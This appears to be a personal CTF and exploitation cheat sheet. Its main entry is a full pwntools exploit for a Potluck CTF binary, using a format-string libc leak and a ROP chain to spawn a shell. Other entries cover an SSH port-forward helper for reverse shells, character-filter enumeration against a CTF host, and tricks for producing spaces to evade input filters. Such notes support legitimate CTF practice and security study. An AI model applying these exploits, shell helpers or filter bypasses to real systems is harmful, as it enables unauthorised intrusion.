### bind random port on ssh host and forward to localhost

Might be useful for reverse shells. A simple replacement for `bore`.

```bash
RCKWRTZ_USAGE=$'\n\n    USAGE: rckwrtz username@host.com 1337'
RCKWRTZ_MISSING_LOCAL_PORT=$'Missing local port to remote forward.'$RCKWRTZ_USAGE
RCKWRTZ_MISSING_HOST=$'Missing ssh host to bind port on.'$RCKWRTZ_USAGE
function rckwrtz() {
  [ -z "$1" ] && ( echo $RCKWRTZ_MISSING_HOST; return 1 ) || host=$1
  [ -z "$2" ] && ( echo $RCKWRTZ_MISSING_LOCAL_PORT; return 1 )|| local_port=$2

  open_port=$(ssh $host -- 'ruby -rsocket -e "puts Addrinfo.tcp(\"\", 0).bind { |s| s.local_address.ip_port }"')
  echo "Opening port "${open_port}" on remote, plugging it to localhost:${local_port}..."
  ssh -N -R ${open_port}:\*:${local_port} $host
  echo "Forwarding. Press ctrl+c to abort."
}
```


### radare pwn pattern (debruijn sequence)

```bash
# find offset
ragg2 -P 512 -r | ./narnia1

# query 
ragg -q 0x41414841
```

### gdb (pwndbg) raw stdin input

```bash
# with python3
r < <(python3.9 -c 'import sys; sys.stdout.write("\x41"*50)')

# with python2
r < <(python2.7 -c 'print("\x41"*50)')

# with ruby
r < <(ruby -e 'print("A"*50)')
```

### print space without a space

```bash
python<<<'print("\x20")'

ruby<<<'print("\x20")'

{echo,-e,'\x20'}

{base64,-d}<<<IAo=

{echo,IAo=}|{base64,-d}

{xxd,-r,-p}<<<20

# $'\x20' will be interpreted as ' '
# <<< handles the string right of it, as a filestream
# zsh allows streaming, without program execution
zsh<<<"<<<$'\x20'>/dev/stdout"
zsh<<<"<<<$'\x20'>/proc/self/fd/1"

# use hex and octal
cat<<<$'\x20'
cat<<<$'\040'
```


### pwntools - ezrop exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge19.play.potluckctf.com --port 31337 ezrop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ezrop')
exe_rop = ROP(exe)

#libc = ELF('libc.so.6')
libc = ELF('/usr/lib/libc.so.6')
libc_rop = ROP(libc)
context.terminal = ['alacritty', '-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'challenge19.play.potluckctf.com'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *vuln+27
b *vuln+51
b *gets
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.readuntil(b'Enter your name: ')
#io.sendline(payload)
#io.send(p64(exe.sym.get("printf")))
io.send(b"%3$p_XYZ\0")
io.send(b'A' * (32 - 9))
io.send(p64(exe.bss() + 0x388)) # rbp
io.send(p64(exe.sym.get("vuln")+19))
io.sendline(b'')


s = io.readuntil(b'XYZ')
# throw away XYZ
s = s[:-4] 
pointer = int(s, base=16)
log.info(f"_IO_2_1_stdin_ @ {hex(pointer)}")

#pwndbg> print 0x7f3cf177b8e0 - 0x7f3cf15a3000
#$1 = 1935584
libc.address = pointer - libc.sym['_IO_2_1_stdin_']

log.info(f"libc base set to {hex(libc.address)}")
log.info(f"libc.puts would be @ {hex(libc.sym['puts'])}")
log.info("search for a /bin/sh string in libc")

bin_sh = next(libc.search(b'/bin/sh'))
log.info(f"/bin/sh in libc @ {hex(bin_sh)}")

rop = ROP(libc)
rop.call('execve', [bin_sh, 0, 0])
log.info(f"rop gadget: {rop.dump()}")
log.info(f"rop gadget as bytes: {bytes(rop)}")

pattern = cyclic(64)
# io.sendline(pattern)
# found offset identifier: 0x6161616c6161616b
log.info("Offset: {}".format(pattern.find(p64(0x6161616c6161616b))))

io.send(b'B' * (32))
io.send(p64(exe.bss() + 0x388)) # rbp
io.send(bytes(rop)) # rip
io.sendline(b'')

io.interactive()
```

### pwntools - enumerate bad and good chars

```python
import requests
from pwn import *

good_char, bad_char = ('', '')
with log.progress('Trying something...') as p:
    for c in range(0x20, 0x7f):
        url = 'http://challenge.nahamcon.com:30936/?echo=%%%02x'
        r = requests.get(url % c)
        p.status(url % c)
        char = chr(c)
        if "Hey mate, you seem to be using some characters" in r.text:
            bad_char = f'{bad_char}{char}'
        else:
            good_char = f'{good_char}{char}'
            log.info(chr(c))
print(f'Bad chars: {bad_char}')
print(f'Good char {good_char}')
```

### joern buildah 

```bash
c=$(buildah from docker.io/archlinux)
buildah run $c pacman --noconfirm -Syu
buildah run $c pacman --noconfirm -S jdk11-openjdk unzip gcc
buildah run $c curl -L "https://github.com/joernio/joern/releases/latest/download/joern-install.sh" -o joern-install.sh
buildah run $c chmod u+x joern-install.sh
buildah run $c ./joern-install.sh --interactive
buildah commit $c joern-arch
```
